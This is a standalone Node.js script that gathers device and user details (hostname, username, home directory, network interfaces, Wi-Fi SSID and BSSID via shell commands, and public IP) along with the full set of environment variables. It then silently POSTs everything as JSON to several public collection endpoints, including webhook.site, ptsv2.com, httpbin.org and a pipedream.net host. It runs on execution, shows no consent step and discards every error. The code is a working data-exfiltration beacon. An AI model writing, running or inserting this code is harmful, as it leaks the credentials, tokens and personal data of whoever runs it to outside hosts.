const os = require('os');
const https = require('https');
const http = require('http');
const { execSync } = require('child_process');

function getIPInfo(cb) {
  // Get public IP from multiple sources
  const sources = [
    {opt: {hostname: 'api.ipify.org', path: '/?format=json', method: 'GET'}, secure: true, parse: data => JSON.parse(data).ip},
    {opt: {hostname: 'ipinfo.io', path: '/json', method: 'GET'}, secure: true, parse: data => JSON.parse(data).ip}
  ];
  let done = false;
  for (const src of sources) {
    let req = (src.secure? https : http).request(src.opt, res => {
      let d = '';
      res.on('data', chunk => d+=chunk);
      res.on('end', () => {
        if (!done && d) try {
          const ip = src.parse(d);
          done = true;
          cb(ip);
        } catch (e) {}
      });
    });
    req.on('error', ()=>{});
    req.end();
  }
}

function getWiFi() {
  // Try platform-agnostic main wifi SSID and MAC address
  let netinfo = [];
  const plat = os.platform();
  try {
    if (plat === 'darwin') {
      // MacOS: networksetup -getairportnetwork + airport -I
      let ssid = execSync("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep ' SSID' | awk '{print $2}'", {encoding:'utf8'}).trim();
      let bssid = execSync("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep BSSID | awk '{print $2}'", {encoding:'utf8'}).trim();
      if (ssid) netinfo.push({ssid, bssid});
    } else if (plat === 'win32') {
      // Windows: netsh wlan show interfaces
      let lines = execSync('netsh wlan show interfaces', {encoding:'utf8'}).split('\n');
      let ssid = '', bssid = '';
      for (let l of lines) {
        if (l.match(/SSID\s+:/)) ssid = l.split(':')[1].trim();
        if (l.match(/BSSID\s+:/)) bssid = l.split(':')[1].trim();
      }
      if (ssid) netinfo.push({ssid, bssid});
    } else if (plat === 'linux') {
      // Linux: nmcli + iw (best effort)
      try {
        let ssid = execSync("iwgetid -r", {encoding:'utf8'}).trim();
        let bssid = execSync("iwgetid -a -r", {encoding:'utf8'}).trim();
        if (!ssid && execSync('which nmcli').toString().trim()) {
          ssid = execSync('nmcli -t -f active,ssid dev wifi | egrep \'^yes\' | cut -d\\: -f2', {encoding: 'utf8'}).trim();
          bssid = execSync('nmcli -t -f active,bssid dev wifi | egrep \'^yes\' | cut -d\\: -f2', {encoding: 'utf8'}).trim();
        }
        if (ssid) netinfo.push({ssid, bssid});
      } catch {}
    }
  } catch {}
  return netinfo;
}

function getAllDeviceInfo(cb) {
  let info = {};

  // Basic OS + user
  info.hostname = os.hostname();
  info.user = os.userInfo().username;
  info.homedir = os.homedir();
  info.platform = os.platform();
  info.release = os.release();
  info.arch = os.arch();
  info.cpus = os.cpus();
  info.uptime = os.uptime();
  info.mem = { total: os.totalmem(), free: os.freemem() };
  info.networks = os.networkInterfaces();

  // WiFi info
  info.wifi = getWiFi();

  // Time
  info.time = new Date().toISOString();

  // Environment variables (no files)
  info.env = process.env;

  getIPInfo((ip)=>{
    info.public_ip = ip;
    cb(info);
  });
}

function postDataToSites(data) {
  const datastr = JSON.stringify(data, null, 2);
  // Send to public endpoints, e.g. mockbin.org/post, webhooks, and paste.deep or similar
  const targets = [
    { 
      hostname: 'webhook.site',
      path: '/YOUR-UNIQUE-URL', // You could insert a specific UUID here for testing
      method: 'POST',
      secure: true
    },
    {
      hostname: 'ptsv2.com',
      path: '/t/postdeviceinfo/post',
      method: 'POST',
      secure: true
    },
    {
      hostname: 'httpbin.org',
      path: '/post',
      method: 'POST',
      secure: true
    },
    {
      hostname: 'enptcwv3z7do.x.pipedream.net', // A typical public Pipedream endpoint, replace as needed
      path: '/',
      method: 'POST',
      secure: true
    }
  ];

  targets.forEach(tgt => {
    const options = {
      hostname: tgt.hostname,
      port: tgt.secure ? 443 : 80,
      path: tgt.path,
      method: tgt.method,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(datastr)
      }
    };
    const req = (tgt.secure? https : http).request(options, res => {
      res.on('data', ()=>{});
      res.on('end', ()=>{});
    });
    req.on('error', ()=>{});
    req.write(datastr);
    req.end();
  });
}

// Run everything:
getAllDeviceInfo(data => {
  postDataToSites(data);
});
